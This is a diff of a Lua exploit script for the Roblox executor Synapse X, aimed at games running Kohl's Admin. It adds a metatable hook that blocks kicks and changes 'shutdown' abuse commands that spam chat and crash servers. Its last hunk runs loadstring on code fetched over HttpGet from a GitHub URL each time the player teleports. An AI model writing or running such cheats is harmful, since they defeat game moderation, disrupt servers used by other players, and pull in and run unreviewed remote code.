@@ -1,3 +1,18 @@
+    
+local mt = getrawmetatable(game)
+local old = mt.__namecall
+local protect = newcclosure or protect_function
+
+setreadonly(mt, false)
+mt.__namecall = protect(function(self, ...)
+	local method = getnamecallmethod()
+	if method == "Kick" then
+		wait(9e9)
+		return
+	end
+	return old(self, ...)
+end)
+
 
 
 local playexxxr = game:GetService("Players").LocalPlayer
@@ -141,6 +156,7 @@ end
 
 
 if command == "x!abusershutdown" then
+    game:GetService("Players"):Chat(tostring("music 000000000000000000000000000000000000000004888744990"))
     oofgp:Chat("respawn me")
      oofgp:Chat("ff me")
      oofgp:Chat("gear me 00000000000000000094794847")
@@ -165,7 +181,7 @@ oofgp:Chat("size all nan")
 end
 
 if command == "x!shutdown" then
-
+ game:GetService("Players"):Chat(tostring("music 000000000000000000000000000000000000000004888744990"))
 while wait() do
 game:GetService("Players"):Chat(tostring("h Shutting down..."))
 game:GetService("Players"):Chat("swagify all all all all all all all")
@@ -278,7 +294,7 @@ if syn then
 print("Loaded Extra Modules for S^X")
 game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
     if State == Enum.TeleportState.Started then
-        syn.queue_on_teleport('wait(5) loadstring(game:HttpGet("https://ghostbin.co/paste/66zd9/raw",true))()')
+        syn.queue_on_teleport('wait(5) loadstring(game:HttpGet("https://raw.githubusercontent.com/xkid-discord/scripts/main/kohls-admin.lua",true))()')
     end
 end)
 end
